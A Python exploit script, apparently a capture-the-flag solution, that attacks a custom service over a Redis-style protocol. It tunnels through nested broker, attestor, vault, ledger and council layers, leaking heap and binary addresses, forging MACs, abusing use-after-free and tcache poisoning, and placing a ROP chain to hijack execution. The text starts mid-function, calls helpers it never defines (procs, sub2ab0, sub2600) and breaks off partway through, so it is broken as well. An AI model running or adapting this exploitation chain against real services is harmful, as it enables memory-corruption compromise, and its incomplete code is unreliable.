    v6=K1^a3^GOLD; v7=a1^a2^K0; v8=K3^a5^C2; v9=K2^a4^0xD1B54A32D192ED03; v5=a1&M
    for _ in range(8):
        v10=(v6+v7)&M; v11=(v8+v9)&M; v12=v10^rol(v6,13); v13=v11^rol(v8,16)
        v14=(v12+v11)&M; v15=(v13+rol(v10,32))&M; v6=v14^rol(v12,17); v9=rol(v14,32)
        v8=v15^rol(v13,21); v16=(v8+v5)&M; v5=(v5+1)&M; v7=mix(v16)^v15
    return mix(v7^v9^a1^v8^v6)
import socket, struct, sys, time
M=(1<<64)-1
C1=0xBF58476D1CE4E5B9; C2=0x94D049BB133111EB
CONST8460=0x243F6A8885A308D3
def rol(x,n):
    n&=63; return ((x<<n)|(x>>((64-n)&63)))&M
def ror(x,n):
    n&=63; return ((x>>n)|(x<<((64-n)&63)))&M
def mix(x):
    x&=M
    v=(C1*(x^(x>>30)))&M
    w=(C2*(v^(v>>27)))&M
    return (w^(w>>31))&M
def unxorshift(y,s):
    x=y
    for _ in range((64+s-1)//s): x = y ^ (x>>s)
    return x&M
def unmix(y):
    y&=M
    w=unxorshift(y,31); v=(w*pow(C2,-1,1<<64))&M
    v=unxorshift(v,27); x=(v*pow(C1,-1,1<<64))&M
    x=unxorshift(x,30); return x
def hash8460(q,K):
    x=0
    for i in range(8): x^=q[i]
    return mix(x^K^CONST8460)
class R:
    def __init__(self, host, port):
        self.s=socket.create_connection((host,port), timeout=15); self.f=self.s.makefile('rb')
    def cmd(self,*args):
        out=b'*%d\r\n'%len(args)
        for a in args:
            if isinstance(a,str): a=a.encode()
            out+=b'$%d\r\n'%len(a)+a+b'\r\n'
        self.s.sendall(out); return self.read()
    def read(self):
        line=self.f.readline()
        if not line: raise EOFError
        t=line[:1]; rest=line[1:-2]
        if t==b'+': return ('simple',rest)
        if t==b'-': return ('error',rest)
        if t==b':': return ('int',int(rest))
        if t==b'$':
            n=int(rest)
            if n<0: return ('nil',None)
            d=self.f.read(n); self.f.read(2); return ('str',d)
        raise Exception('bad %r'%line)

class ModTunnel:
    def __init__(self, r):
        self.r=r; self.seq=0
    def arm(self):
        r=self.r
        st,cl=r.cmd('CLIENT','ID'); cid=cl if st=='int' else -1
        seed=bytes([(i*7)&0xff for i in range(128)])
        assert r.cmd('relay.begin',seed)[0]=='simple'
        assert r.cmd('relay.bind')[0]=='simple'
        st,snap=r.cmd('relay.snapshot'); assert st=='str' and len(snap)==80
        q=list(struct.unpack('<10Q',snap))
        X=unmix(q[8]); xx=0
        for i in range(8): xx^=q[i]
        K=X^xx^CONST8460
        assert hash8460(q[:8],K)==q[8]
        assert r.cmd('relay.retire')[0]=='simple'
        assert r.cmd('relay.ledger')[0]=='simple'
        for i in range(3): assert r.cmd('relay.stamp',str(i))[0]=='simple'
        stamps=[]
        for i in range(3):
            st,s=r.cmd('relay.stampinfo',str(i)); assert st=='str' and len(s)==48
            stamps.append(struct.unpack('<6Q',s))
        st,ls=r.cmd('relay.snapshot'); assert st=='str' and len(ls)==80
        L=list(struct.unpack('<10Q',ls))
        assert L[0]==0x3352454744454C52
        q18=L[2]; P=q[2]^q18
        # solve S
        D=rol(L[4]^K,13)^L[3]
        cols=[(1<<j)^rol(1<<j,42) for j in range(64)]
        basis={}
        for j in range(64):
            vec=cols[j]; comb=1<<j
            while vec:
                p=vec.bit_length()-1
                if p in basis: bv,bc=basis[p]; vec^=bv; comb^=bc
                else: basis[p]=(vec,comb); break
        sols=[]
        vec=D; comb=0; ok=True
        while vec:
            p=vec.bit_length()-1
            if p in basis: bv,bc=basis[p]; vec^=bv; comb^=bc
            else: ok=False; break
        if not ok: raise Exception('no S solution')
        sols=[comb]
        # kernel
        nv=[]
        for j in range(64):
            vec=cols[j]; c2=1<<j
            while vec:
                p=vec.bit_length()-1
                if p in basis: bv,bc=basis[p]; vec^=bv; c2^=bc
                else: break
            if vec==0 and c2: nv.append(c2)
        if len(nv)<=6:
            base=list(sols)
            for v in nv: base=base+[s^v for s in base]
            sols=list(set(base))
        Sc=None
        for cand in sols:
            if (cand&0xfff)==0x300 and 0x700000000000<=cand<=0x800000000000:
                Sc=cand; break
        if Sc is None: raise Exception('S not found')
        v=q[3]^0x082EFA98EC4E6C89 if False else q[3]^0x82EFA98EC4E6C89
        rc=11
        for i in range(3):
            T=stamps[i][2]^q18
            v=rol(v^stamps[i][3]^T^stamps[i][4],rc); rc+=9
        fold=v
        B=bytearray(512)
        def putq(off,val): struct.pack_into('<Q',B,off,val&M)
        for i in range(5): putq(i*8,q[i])
        putq(40, rol(P^K^(Sc+0x100),17))
        putq(48, fold); putq(56,1)
        putq(64, hash8460(list(struct.unpack('<8Q',bytes(B[:64]))),K))
        for i in range(4):
            mac=rol(fold^P^K^((0x9E3779B97F4A7C15*(i+1))&M),7*i+9)
            res=r.cmd('relay.fragment',str(i),str(mac),bytes(B[i*128:(i+1)*128]))
            if res[0]!='simple': raise Exception('fragment fail %r'% (res,))
        res=r.cmd('relay.commit')
        if res[0]!='simple': raise Exception('commit fail %r'%(res,))
        print('MODULE ARMED, cid',cid,'base',hex(Sc-0x8300))
        return Sc-0x8300
    def tunnel(self, frame):
        res=self.r.cmd('relay.tunnel', frame)
        return res

class Broker:
    def __init__(self,tun): self.t=tun; self.seq=0
    def frame(self,cmd,a5=0,a6=0,payload=b''):
        self.seq+=1
        body=struct.pack('<IIII',0x334B4252, cmd|(a5<<8)|(a6<<16), len(payload), self.seq)+payload
        st,data=self.t.tunnel(body)
        if st!='str': return {'err':(st,data)}
        d=data
        if len(d)<16: return {'err':('short',d)}
        magic,cmdh,plen,seq=struct.unpack('<IIII',d[:16])
        return dict(cmd=cmdh&0xff,a5=(cmdh>>8)&0xff,a6=(cmdh>>16)&0xff,plen=plen,seq=seq,payload=d[16:])


import sys
host,port=sys.argv[1],int(sys.argv[2])
r=R(host,port); print('PING',r.cmd('PING'))
mt=ModTunnel(r); base=mt.arm()
b=Broker(mt)
print('broker ping', b.frame(0x7f))
print('alias', b.frame(0x10,0))
def leak(v4):
    rr=b.frame(0x11,0,0)
    ent=bytearray(0x90)
    struct.pack_into('<Q',ent,0,v4&M); struct.pack_into('<Q',ent,8,8)
    struct.pack_into('<Q',ent,16,0x1111111111111111); struct.pack_into('<Q',ent,32,0xABCDEF)
    struct.pack_into('<Q',ent,24,mix(0xABCDEF^0x1111111111111111^0x6A09E667F3BCC909))
    b.frame(0x14,0,0,bytes(ent)); c=b.frame(0x15,0,0)
    if c.get('cmd')!=0x95: return None
    return struct.unpack('<Q',c['payload'])[0]
K50=leak(0x4C40); K48=leak(0x4C38); initv=leak(0x48E0)
print('leaks',hex(K50),hex(K48),hex(initv))
bbase=initv-0x22f0
slices=[]
for o in range(4):
    rr=b.frame(0x30,o,o,b''); rr2=b.frame(0x31,o,0)
    slices.append(struct.unpack('<6Q',rr2['payload']))
b.frame(0x20,0,0); rr=b.frame(0x21,0,0)
rt=struct.unpack('<8Q',rr['payload']); blob=rt[1]^K50
v=rt[2]^0xA54FF53A5F1D36F1; rot=7
for i in range(4):
    sp=slices[i][2]^K50
    v=rol(v^slices[i][4]^sp^slices[i][3],rot); rot+=11
new32=rol(blob^K48^(bbase+0x4000),21); new48=1
qs=[rt[0],rt[1],rt[2],rt[3],new32,v,new48]
xx=0
for x in qs: xx^=x
newhash=mix(xx^K48^0xBB67AE8584CAA73B)
for idx,val in ((-4,new32),(-3,v),(-2,new48),(-1,newhash)):
    pl=bytes([idx&0xff])+b'\0'*7+struct.pack('<Q',val)
    b.frame(0x22,0,0,pl)
rr=b.frame(0x23,0,0,bytes([0,1,2,3]))
print('ATTEST',rr)

# ---------------- attestor through broker 0x40 ----------------
class AR:
    def __init__(self,b): self.b=b; self.seq=0
    def fr(self,cmd,a5=0,a6=0,payload=b''):
        self.seq+=1
        body=struct.pack('<IIII',0x34415452, cmd|(a5<<8)|(a6<<16), len(payload), self.seq)+payload
        r=self.b.frame(0x40,0,0,body)
        if r.get('cmd')!=0xB0:
            print('RELAY ERR',r); raise SystemExit
        d=r['payload']
        magic,cmdh,plen,seq=struct.unpack('<IIII',d[:16])
        return dict(cmd=cmdh&0xff,a5=(cmdh>>8)&0xff,a6=(cmdh>>16)&0xff,plen=plen,seq=seq,payload=d[16:])
a=AR(b)
def ck(exp,cmd,a5=0,a6=0,payload=b''):
    r=a.fr(cmd,a5,a6,payload)
    if r['cmd']!=exp:
        print('UNEXPECTED',hex(cmd),a5,a6,'->',hex(r['cmd']),r['payload'][:32].hex()); raise SystemExit
    return r
ck(0xE0,0x50,0,0)
ck(0x90,0x10,0); ck(0x90,0x10,1)
ck(0xC0,0x30,0,0); ck(0xC1,0x31,0,0); ck(0xC2,0x32,0,0)
r=ck(0xC3,0x33,0,0); q=struct.unpack('<10Q',r['payload'])
print('page leak',hex(q[0]))
base=q[0]<<12; seal=base+0x2A0
print('heap base',hex(base),'seal',hex(seal))
ck(0x91,0x11,1,0); ck(0x92,0x12,0); ck(0x92,0x12,1)
buf=bytearray(288); struct.pack_into('<Q',buf,0,(base>>12)^(seal-0x10))
ck(0x94,0x14,0,0,bytes(buf))
ck(0x90,0x10,0); ck(0x90,0x10,2); ck(0x91,0x11,2,1)
r=ck(0x93,0x13,1,0); q1=struct.unpack('<10Q',r['payload'])
print('READ1',[hex(x) for x in q1])
seal56=q1[9]
ck(0x90,0x10,3); ck(0x91,0x11,3,2); ck(0x92,0x12,0); ck(0x92,0x12,3)
struct.pack_into('<Q',buf,0,(base>>12)^seal)
ck(0x94,0x14,2,0,bytes(buf))
ck(0x90,0x10,0); ck(0x90,0x10,1); ck(0x91,0x11,1,3)
r=ck(0x93,0x13,3,0); q2=struct.unpack('<10Q',r['payload'])
print('READ2',[hex(x) for x in q2])
sub23f0=q2[9]; piebase=sub23f0-0x23f0
print('sub23F0',hex(sub23f0),'pie',hex(piebase),'heap',hex(base))
if (sub23f0&0xfff)!=0x3f0:
    print('BAD PIE'); raise SystemExit
seal64=q2[8]; v58=seal56
K50=(seal64 ^ ror(seal,17) ^ v58 ^ sub23f0)&M
K48=(v58 ^ rol(1,23))&M
print('K50',hex(K50),'K48',hex(K48))
sub4000=piebase+0x4000; blob8=1
blob56=(K48 ^ rol(blob8,23))&M
blob16=rol(sub4000 ^ K50 ^ seal ^ blob56,31)
blob24=ror(sub4000 ^ rol(seal,15) ^ blob8 ^ rol(K50,9),21)
blob32=mix(blob8 ^ blob16 ^ K50 ^ K48 ^ 0x3C6EF372FE94F82A)
blob40=mix(blob56 ^ blob24 ^ seal ^ ror(K50,13) ^ 0xA54FF53A5F1D36F0)
B=bytearray(288)
def putq(o,v): struct.pack_into('<Q',B,o,v&M)
putq(0,0x344C414553545252); putq(8,blob8); putq(16,blob16); putq(24,blob24)
putq(32,blob32); putq(40,blob40); putq(48,seal); putq(56,blob56); putq(72,sub23f0)
putq(0xD0,0); putq(0xD8,0x21); putq(0xF0,0); putq(0xF8,0x131)
print('seal write',hex(ck(0x94,0x14,3,0,bytes(B))['cmd']))
rr=a.fr(0x51,0,0)
print('ATTESTOR VERIFY ->',hex(rr['cmd']),rr['payload'][:24].hex())


# ---------------- vault through attestor 0x60 ----------------
vseq=[0]
def vframe(cmd,a5=0,a6=0,payload=b''):
    vseq[0]+=1
    return struct.pack('<IIII',0x33564C52, cmd|(a5<<8)|(a6<<16), len(payload), vseq[0])+payload
def V(cmd,a5=0,a6=0,payload=b''):
    body=vframe(cmd,a5,a6,payload)
    r=a.fr(0x60,0,0,body)
    if r['cmd']!=0xB0 or len(r['payload'])<16:
        print('V RELAY ERR',hex(r['cmd']),r['payload'][:32].hex()); raise SystemExit
    d=r['payload']
    magic,cmdh,plen,seq=struct.unpack('<IIII',d[:16])
    return dict(cmd=cmdh&0xff,a5=(cmdh>>8)&0xff,a6=(cmdh>>16)&0xff,plen=plen,seq=seq,payload=d[16:])
def rle_read(k):
    nb=8; pay=bytearray(16*nb)
    def setblock(i,op,arg):
        off=16*i; pay[off]=op; pay[off+1]=arg
        cks=((arg ^ (97*i) ^ (op<<8)) ^ 0x4D27)&0xffff
        struct.pack_into('<H',pay,off+2,cks); struct.pack_into('<I',pay,off+4,0)
    setblock(0,0x2D,k&0xff); setblock(1,0x43,0); setblock(2,0x6E,0)
    for i in range(3,nb-1): setblock(i,0x43,0)
    setblock(nb-1,0x79,0)
    r=V(5,0,0,bytes(pay))
    if r['cmd']!=0x80 or r['plen']<8:
        print('RLE FAIL',k,hex(r['cmd']),r['payload'][:16].hex()); raise SystemExit
    return struct.unpack('<Q',r['payload'][:8])[0]
vals={}
for k,name in [(-6,'R0'),(-5,'R1'),(-4,'R2'),(-3,'self'),(-2,'sub2680'),(-1,'R3')]:
    vals[name]=rle_read(k); print('RLE',name,hex(vals[name]))
R0,R1,R2,SELF,SUB2680,R3=vals['R0'],vals['R1'],vals['R2'],vals['self'],vals['sub2680'],vals['R3']
PIE=SUB2680-0x2680; print('PIE',hex(PIE))
unlock=rol(SUB2680 ^ SELF ^ R3 ^ R0 ^ 0x452821E638D01377,19)
r=V(6,0,0,struct.pack('<Q',unlock)); print('VAULT UNLOCK',hex(r['cmd']))
r=V(0x18,0,0,struct.pack('<Q',0)); print('ticket create',hex(r['cmd']))
V(0x19,0,0); r=V(0x1A,0,0); q=struct.unpack('<5Q',r['payload']); ticket=q[2]^R1; t24=q[3]
print('ticket',hex(ticket),'t24',hex(t24))
r=V(0x28,1,0); print('ctx create',hex(r['cmd']))
V(0x29,1,1); r=V(0x2A,1,0); q=struct.unpack('<3Q',r['payload']); ctx=q[1]^R1
print('ctx',hex(ctx))
V(0x1B,0,0)
T=bytearray(320)
def tq(o,x): struct.pack_into('<Q',T,o,x&M)
tq(0,0x3354454B43495452); tq(8,0); tq(16,ticket^R1); tq(24,t24)
tq(32,rol(ctx^t24^R1^R3,17)); tq(40,1)
qs=[0x3354454B43495452,0,(ticket^R1)&M,t24,rol(ctx^t24^R1^R3,17),1]
xx=0
for x in qs: xx^=x
tq(48,mix(xx ^ R3 ^ R1 ^ 0xBE5466CF34E90C6C))
r=V(0x1C,0,0,bytes(T)); print('ticket write',hex(r['cmd']))
V(0x2B,1,0); r=V(0x2C,1,0); print('ctx init',hex(r['cmd']))
C=bytearray(0x400)
def cq(o,x): struct.pack_into('<Q',C,o,x&M)
cq(0,0x33545845544E4352); cq(8,ctx^R1); cq(16,ticket); cq(24,t24)
cq(32,rol(ctx ^ R2 ^ (PIE+0x2670),21)); cq(40,960); cq(48,1)
xx=0
for i in range(7): xx ^= struct.unpack('<Q',bytes(C[i*8:i*8+8]))[0]
cq(56,mix(xx ^ R3 ^ R2 ^ 0xC0AC29B7C97C50DD))
# ---- permit at ctx+0x240 for sub_4000 ----
MAG=0x3552454744454C52
mix1=mix(R1 ^ ctx ^ MAG)
h1=rol(ticket ^ R2 ^ t24 ^ 0x6A09E667F3BCC909,17)
h2=mix(SELF ^ R3 ^ mix1 ^ h1)
rdx_pre=(SUB2680 + R0 + 0x6A09E667F3BCC909 + h2)&M
h3=rol(rdx_pre,29)
rcx_pre=ticket ^ R2 ^ t24 ^ 0x6A09E667F3BCC909
mac=rol(rdx_pre,6) ^ R3 ^ rol(rcx_pre,24) ^ mix1 ^ rol(h2,23)
cq(0x240,MAG); cq(0x248,5); cq(0x250,ctx); cq(0x258,ticket); cq(0x260,t24)
cq(0x268,SELF); cq(0x270,R3); cq(0x278,mix1); cq(0x280,h1); cq(0x288,h2); cq(0x290,h3); cq(0x298,mac); cq(0x2A0,1)
# fake reply at ctx+0x180: u32 16 + 16B frame (magic RLS3, cmd 0xE6, len0, seq)
struct.pack_into('<I',C,0x180,0x10)
struct.pack_into('<IIII',C,0x184,0x33534C52,0xE6,0,0x1234)
# ---- ROP at 0x40: write(1, ctx+0x180, 20); sub_4000(ctx); main loop ----
POP_RDI=PIE+0x2954; POP_RSI=PIE+0x2964; POP_RDX=PIE+0x2974; WRITE=PIE+0x1220
rop=[POP_RDI,1, POP_RSI,ctx+0x180, POP_RDX,20, WRITE, POP_RDI,ctx, PIE+0x4000, POP_RDI,ctx+0x300, PIE+0x2670]
for i,x in enumerate(rop): cq(64+i*8,x)
cq(0x340,PIE+0x29e0)
for idx in range(4):
    m=rol(ctx ^ ((0x9E3779B97F4A7C15*idx)&M) ^ R3 ^ R2, (idx+13)&63)
    frag=bytes(C[idx*256:(idx+1)*256])
    r=V(0x2D,1,idx,struct.pack('<Q',m)+frag)
    print('frag',idx,hex(r['cmd']))
    if r['cmd']!=0xA5: print('frag fail'); raise SystemExit
# case46 -> pivot; ROP writes reply + sub_4000 -> 704C=1 -> main loop
r=V(0x2E,1,0,bytes([1,0]))
print('CASE46 relay resp cmd',hex(r['cmd']),'plen',r['plen'])

# ---------------- ledger through vault 0x60 ----------------
lseq=[0]
def ledger_fr(cmd,a5=0,a6=0,payload=b''):
    lseq[0]+=1
    body=struct.pack('<IIII',0x3544474C, cmd|(a5<<8)|(a6<<16), len(payload), lseq[0])+payload
    r=V(0x60,0,0,body)
    d=r['payload']
    if len(d)<16: return {'cmd':-1,'plen':0,'payload':b''}
    magic,cmdh,plen,seq=struct.unpack('<IIII',d[:16])
    return dict(cmd=cmdh&0xff,a5=(cmdh>>8)&0xff,a6=(cmdh>>16)&0xff,plen=plen,seq=seq,payload=d[16:16+plen])
r=ledger_fr(0x7F); q=struct.unpack('<6Q',r['payload']); F=q[:4]
print('LEDGER HELLO',hex(r['cmd']),[hex(x) for x in F])
P0=procs(); print('PROCS before test',P0)
def l_blk(op,slot,arg,idx):
    b=bytearray(16); b[0]=op; b[1]=slot; b[2]=arg&0xff
    struct.pack_into('<H',b,4,((16*slot)^(115*idx)^(arg&0xff)^(op<<8)^0x5D39)&0xffff)
    return bytes(b)
def l_read6(slot,start):
    a2ct=b'!2CT'; blocks=[l_blk(a2ct[slot],slot,start&0xff,0)]; bi=1
    for rr in range(6):
        blocks.append(l_blk(0x71,slot,0,bi)); bi+=1
        blocks.append(l_blk(0x83,slot,0,bi)); bi+=1
        if rr<5: blocks.append(l_blk(0x94,slot,0,bi)); bi+=1
    blocks.append(l_blk(0xa6,slot,0,bi))
    return ledger_fr(0x10,slot,0,b''.join(blocks))
tab=[None]*24; commits=[]
for slot in range(4):
    start=-24+6*slot
    r=l_read6(slot,start)
    if r['cmd']!=0x80:
        print('LEDGER READ FAIL',slot,hex(r['cmd']),r['payload'][:16].hex()); raise SystemExit
    outs=struct.unpack('<6Q',r['payload']); commits.append((slot,outs))
    for i in range(6):
        key=mix((slot<<32)|i); rot=(9*slot+7+i)&63
        tab[start+i+24]=ror(outs[i],rot)^F[slot]^key
print('LEDGER TABLE READ OK')
TAGN={'LGNONCE5':0x3545434E4F4E474C,'LGEPOCH5':0x3548434F5045474C,'LGLKEY05':0x353059454B4C474C,'LGLKEY15':0x353159454B4C474C,'LGLKEY25':0x353259454B4C474C,'LGLKEY35':0x353359454B4C474C,'LGSALT05':0x3530544C4153474C,'LGSALT15':0x3531544C4153474C,'LRANSCR5':0x355243534E41524C}
def val(name):
    k=tab.index(TAGN[name]); return tab[k+1]
A=val('LGNONCE5')^mix(F[0]^TAGN['LGNONCE5'])
B=val('LGEPOCH5')^mix(A^TAGN['LGEPOCH5'])
K0=val('LGLKEY05')^mix(A^B^TAGN['LGLKEY05'])
K1=val('LGLKEY15')^mix(A^K0^TAGN['LGLKEY15'])
K2=(val('LGLKEY25')+mix((B+K1+TAGN['LGLKEY25'])&M))&M
K3=val('LGLKEY35')^mix(A^TAGN['LGLKEY35'])^rol(K2,27)
E0=val('LGSALT05')^mix(K0^TAGN['LGSALT05'])
E1=val('LGSALT15')^mix(K3^TAGN['LGSALT15'])
K=(K0,K1,K2,K3)
G=val('LRANSCR5')^sub2ab0(TAGN['LRANSCR5'],E0,E1,A,0,K)
print('LEDGER SECRETS A',hex(A),'B',hex(B),'E0',hex(E0),'E1',hex(E1),'G0',hex(G))
MOD=0x35564D444F4D474C
for slot,outs in commits:
    h=sub2ab0((slot^MOD)&M,outs[0],outs[1],outs[4],outs[5],K)
    G=mix(G^h)
q0=sub2ab0(0x354B434F4C4E554C,A,B,G,E0,K)
q1=sub2ab0(0x354B434F4C4E544C,q0,E1,F[0],F[3],K)
print('LEDGER q0',hex(q0),'q1',hex(q1))
r=ledger_fr(0x11,0,0,struct.pack('<QQ',q0,q1))
print('LEDGER UNLOCK RESP',hex(r['cmd']),r['plen'],r['payload'][:32].hex())

# ---------------- post-unlock permit (LPERMIT5 + RLRELAY5) ----------------
def lck(exp,cmd,a5=0,a6=0,payload=b''):
    r=ledger_fr(cmd,a5,a6,payload)
    if r['cmd']!=exp:
        print('PERMIT EXPECT',hex(exp),'got',hex(r['cmd']),r['payload'][:16].hex()); raise SystemExit
    return r
lck(0x90,0x20); lck(0x91,0x21)
r=lck(0x92,0x22); uaf=struct.unpack('<5Q',r['payload'])
LTAG=0x35464E414D474C52
H1x=sub2ab0((LTAG^0x10)&M, B, A, 1, G, K)
addr6270=uaf[3]^H1x
B1=(uaf[2]^mix(1^A^LTAG))&M
print('PERMIT PIE leak addr6270',hex(addr6270),'B1',hex(B1))
if (addr6270&0xfff)!=0x270: print('bad leak'); raise SystemExit
addr6070=addr6270-0x200
prot=addr6270 ^ (B1>>12)
mac=sub2ab0(0x35464E414D474C62, prot, B1, addr6270, G, K)
lck(0x93,0x23,0,0,struct.pack('<QQ',prot,mac))
LP=bytearray(0x98)
def lq(o,x): struct.pack_into('<Q',LP,o,x&M)
lq(0,0x3554494D5245504C); lq(8,5); lq(0x10,A); lq(0x18,B); lq(0x20,addr6270); lq(0x28,addr6070); lq(0x30,G)
h1=sub2ab0(0x3554494D5245505C,A,B,addr6270,addr6070,K)
h2=sub2ab0(0x3554494D5245506C,G,h1,E0,E1,K)
h3=sub2ab0(0x3554494D5245507C,h1,h2,addr6270,G,K)
h4=sub2ab0(0x3554494D5245500C,h2,h3,addr6070,B,K)
macl=E1^E0^h1^rol(h2,11)^rol(h3,29)^ror(h4,17)
lq(0x38,h1); lq(0x40,h2); lq(0x48,h3); lq(0x50,h4); lq(0x58,macl); lq(0x60,1)
pay=bytearray(0x130); pay[0x98:0x98+0x98]=LP
lck(0x94,0x24,0,0,bytes(pay))
lck(0xA0,0x30); lck(0xA1,0x31)
r=lck(0xA2,0x32); uaf2=struct.unpack('<5Q',r['payload'])
RTAG=0x35594C4552474C52
H1y=sub2ab0((RTAG^0x10)&M, B, A, 1, G, K)
addr6070b=uaf2[3]^H1y
R1=(uaf2[2]^mix(1^A^RTAG))&M
prot2=addr6070b ^ (R1>>12)
mac2=sub2ab0(0x35594C4552474C62, prot2, R1, addr6070b, macl, K)
lck(0xA3,0x33,0,0,struct.pack('<QQ',prot2,mac2))
RP=bytearray(0x1F8)
def rq2(o,x): struct.pack_into('<Q',RP,o,x&M)
rq2(0,0x3559414C45524C52); rq2(8,5); rq2(0x10,A); rq2(0x18,B); rq2(0x20,addr6270); rq2(0x28,macl); rq2(0x30,G); rq2(0x38,3)
g1=sub2ab0(0x3559414C45524C42,A,B,addr6270,macl,K)
g2=sub2ab0(0x3559414C45524C72,G,3,E1,g1,K)
g3=sub2ab0(0x3559414C45524C62,g1,g2,addr6070,h3,K)
g4=sub2ab0(0x3559414C45524C12,g2,g3,h4,A,K)
macg=g1^macl^rol(g2,13)^rol(g3,31)^ror(g4,11)
rq2(0x40,g1); rq2(0x48,g2); rq2(0x50,g3); rq2(0x58,g4); rq2(0x60,macg); rq2(0x68,1)
pay2=bytearray(0x3F0); pay2[0x1F8:0x1F8+0x1F8]=RP
lck(0xA4,0x34,0,0,bytes(pay2))
r=lck(0xB0,0x40)
print('LEDGER PERMIT OK:',r['payload'])
# ---------------- council over ledger cmd 0x60 ----------------
cseq=[0]
class CA:
    def fr(self,cmd,a5=0,a6=0,payload=b''):
        cseq[0]+=1
        body=struct.pack('<IIII',0x35434E52, cmd|(a5<<8)|(a6<<16), len(payload), cseq[0])+payload
        r=ledger_fr(0x60,0,0,body)
        if r['cmd']!=0xB1:
            print('COUNCIL RELAY ERR',hex(r['cmd']),r['payload'][:16].hex()); raise SystemExit
        d=r['payload']
        m,ch,pl,sq=struct.unpack('<IIII',d[:16])
        return dict(magic=m,cmd=ch&0xff,a5=(ch>>8)&0xff,a6=(ch>>16)&0xff,plen=pl,seq=sq,payload=d[16:16+pl])
c=CA()

r=c.fr(0x7F); q=struct.unpack('<4Q',r['payload']); print('HELLO',[hex(x) for x in q])
Q5078=q[0]; q1=q[1]; q2=q[2]
tab=[None]*16
for k,a5 in enumerate([0xFC,0xFD,0xFE,0xFF]):
    r=c.fr(0x10,a5,0,b'')
    print('0x10 a5',hex(a5),'->',hex(r['cmd']),r['plen'])
    if r['cmd']!=0x80: sys.exit(1)
    outs=struct.unpack('<4Q',r['payload'])
    for idx in range(4):
        key=mix((idx | ((k)<<32))&M)
        rot=(11*k+5+idx)&63
        loaded=ror(outs[idx],rot)^Q5078^key
        tab[4*k+idx]=loaded
print('TABLE16',[hex(x) for x in tab])
TAGS={'CCNONCE5':0x3545434E4F4E4343,'CCTICK5':0x35544B4349544343,'CNCKEY05':0x353059454B434E43,'CNCKEY15':0x353159454B434E43,'CNCKEY25':0x353259454B434E43,'CNCKEY35':0x353359454B434E43,'CNCALT05':0x3530544C41434E43,'CNCALT15':0x3531544C41434E43}
def val(n):
    k=tab.index(TAGS[n]); return tab[k+1]
C8=val('CCNONCE5')^mix(Q5078^TAGS['CCNONCE5'])
C0=val('CCTICK5')^mix(C8^TAGS['CCTICK5'])
A0=val('CNCKEY05')^mix(C0^C8^TAGS['CNCKEY05'])
A8=val('CNCKEY15')^mix(A0^C8^TAGS['CNCKEY15'])
B0=(val('CNCKEY25')+mix((C0+A8+TAGS['CNCKEY25'])&M))&M
B8=val('CNCKEY35')^mix(C8^TAGS['CNCKEY35'])^rol(B0,25)
K=(A0,A8,B0,B8)
F0=val('CNCALT05')^sub2600(TAGS['CNCALT05'],C8,C0,A0,0,K)
F1=val('CNCALT15')^sub2600(TAGS['CNCALT15'],C0,C8,B8,0,K)
print('C8',hex(C8),'C0',hex(C0),'A0',hex(A0),'A8',hex(A8),'B0',hex(B0),'B8',hex(B8),'F0',hex(F0),'F1',hex(F1))
H1h=sub2600(0x35454C4341524F53,C8,C0,Q5078,0,K)
H2h=sub2600(0x35454C4341524F63,C0,C8,Q5078,0,K)
sub2740_=q1^H1h
addr50d0=q2^H2h
PIE=addr50d0-0x50D0
assert sub2740_==PIE+0x2740, 'PIE check failed'
print('PIE',hex(PIE))


# ---------------- build plan + embedded gate ----------------
def putq(buf,o,x): struct.pack_into('<Q',buf,o,x&M)
def getq(buf,o): return struct.unpack('<Q',buf[o:o+8])[0]
PTAG=0x354E414C50434E43
P=bytearray(0x200)
for i in range(32):
    putq(P,8*i, sub2600((i^PTAG)&M, C8, C0, F0 if (i&1)==0 else F1, i, K))
# rolling hash v6
v6=(C0^C8^PTAG)&M
for i in range(32):
    v9=(i ^ rol(getq(P,8*i), 3+7*i))&M
    v6=mix(v6^v9)
# embedded gate at 0x100
putq(P,0x100,0x35544D5250434E43)
putq(P,0x108,C8); putq(P,0x110,C0)
putq(P,0x118,PIE+0x5360); putq(P,0x120,PIE+0x50D0); putq(P,0x128,PIE+0x2740)
putq(P,0x130,v6)
GH1=sub2600(0x35544D5250434E53,C8,C0,PIE+0x5360,PIE+0x50D0,K)
GH2=sub2600(0x35544D5250434E63,PIE+0x2740,v6,F0,F1,K)
GH3=sub2600(0x35544D5250434E73,GH1,GH2,PIE+0x5360,Q5078,K)
GH4=sub2600(0x35544D5250434E03,GH2,GH3,PIE+0x50D0,C0,K)
GMAC=ror(GH4,19)^rol(GH3,27)^rol(GH2,9)^GH1^v6
putq(P,0x138,GH1); putq(P,0x140,GH2); putq(P,0x148,GH3); putq(P,0x150,GH4)
putq(P,0x158,GMAC); putq(P,0x160,1)
planbytes=bytes(P)
payload=b''.join(bytes([1,b]) for b in planbytes)
r=c.fr(0x20,0,0,payload)
print('PLAN RESP',hex(r['cmd']),r['plen'])
if r['cmd']!=0x90: print('plan failed'); sys.exit(1)
plan_mac=GMAC
# ---------------- outer gate via tcache poison ----------------
def ck(exp,cmd,a5=0,a6=0,payload=b''):
    r=c.fr(cmd,a5,a6,payload)
    if r['cmd']!=exp: print('EXPECT',hex(exp),'got',hex(r['cmd'])); sys.exit(1)
    return r
ck(0xA0,0x30); ck(0xA1,0x31)
r=ck(0xA2,0x32); u=struct.unpack('<5Q',r['payload'])
BTAG=0x35544F4C4C414243
R1=(u[2]^mix(1^C8^BTAG))&M
print('UAF',[hex(x) for x in u],'R1',hex(R1))
prot2=(PIE+0x50D0) ^ (R1>>12)
mac2=sub2600(0x35544F4C4C414273, prot2, R1, PIE+0x50D0, plan_mac, K)
ck(0xA3,0x33,0,0,struct.pack('<QQ',prot2,mac2))
G=bytearray(0x178)
putq(G,0x00,0x3545544147434E43)
putq(G,0x08,C8); putq(G,0x10,C0)
putq(G,0x18,PIE+0x5360)
putq(G,0x20,plan_mac)
X=(PIE+0x2C80) ^ (PIE+0x50D0) ^ C0 ^ B0
f58=(rol(X,23)+A0)&M
putq(G,0x28,f58)
V1=sub2600(0x3545544147434E53,C8,C0,PIE+0x5360,plan_mac,K)
V2=sub2600(0x3545544147434E63,f58,PIE+0x50D0,F0,F1,K)
V3=sub2600(0x3545544147434E73,V1,V2,GH3,GH4,K)
V4=sub2600(0x3545544147434E03,V2,V3,Q5078,C0,K)
VMAC=ror(V4,13)^ror(V3,31)^rol(V2,15)^V1^plan_mac
putq(G,0x30,V1); putq(G,0x38,V2); putq(G,0x40,V3); putq(G,0x48,V4); putq(G,0x50,VMAC); putq(G,0x58,1)
